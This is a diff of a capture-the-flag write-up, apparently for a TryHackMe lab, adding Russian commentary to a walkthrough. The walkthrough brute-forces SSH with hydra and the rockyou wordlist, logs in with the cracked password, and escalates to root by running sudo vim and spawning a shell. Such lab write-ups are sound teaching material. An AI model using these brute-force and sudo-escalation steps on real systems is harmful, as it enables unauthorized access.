@@ -154,31 +154,42 @@ ftp> get ForMitch.txt
 cat ForMitch.txt                             
 Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
 ```
--s 2222
+обязательно нужно указать порт тк он не стандартный -s 2222
 ```
 hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.129.143.203 -s 2222
 ```
+<img width="961" height="252" alt="Снимок экрана 2026-04-30 в 08 55 03" src="https://github.com/user-attachments/assets/f998459f-c519-45bc-a7be-54d94e501831" />
+
 ```
 [2222][ssh] host: 10.129.143.203   login: mitch   password: secret
 ````
+Есть пароль, пробую подключиться по ssh
 ```
 ssh mitch@10.129.143.203 -p 2222
 ```
+я в системе, проверяю где я, что в папке и что я могу
 ```
 $ pwd
 /home/mitch
 $ ls
 user.txt
+```
+вижу первый флаг, но пока игнорирую его, фокусируюсь на эскалации
+
+```
 $ sudo -l
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 ```
+
+отлично, у меня есть возможность влиять на бинарник от имени root, это хороший вектор для эскалации
 ```
 $ sudo vim
 ```
 ```
 :!/bin/bash
 ```
+заходим от имени рут, это получилось потому что у меня был доступ, к доверенной утилите с правами рут, через которую я запустил командную оболчку и получил доступ.
 ```
 root@Machine:~# whoami
 root
@@ -192,5 +203,7 @@ root.txt
 root@Machine:/root# cat root.txt
 W3ll d0n3. You made it!
 ```
-
+Забираем 2 флага, отвечаем на вопросы в THM закрываем машину. 
+Мне понравилось, много интересных моментов куда можно углубиться и начать зачитываться, если есть желание, ответ как и в машине DAV на виду sudo -l и отталкиваемся от того что имеем
+Всем добра!
 
